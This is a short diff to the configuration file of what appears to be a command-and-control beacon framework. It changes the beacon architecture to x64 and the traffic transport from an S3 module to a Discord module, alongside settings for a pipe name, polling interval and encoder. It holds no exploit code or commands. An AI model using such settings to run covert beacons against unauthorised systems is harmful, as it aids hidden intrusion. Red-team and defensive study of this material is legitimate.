@@ -16,13 +16,13 @@ C2_PIPE_NAME = "foobar"
 C2_BLOCK_TIME = 100
 
 # Desired Architecture of the Beacon
-C2_ARCH = "x86"
+C2_ARCH = "x64"
 
 # How long to wait (in seconds) before polling the server for new tasks/responses
 IDLE_TIME = 5
 
 ENCODER_MODULE = "encoder_b64url"
-TRANSPORT_MODULE = "transport_s3"
+TRANSPORT_MODULE = "transport_discord"
 
 ###########################################
 # DEBUG: </END GHETTO CONFIG>
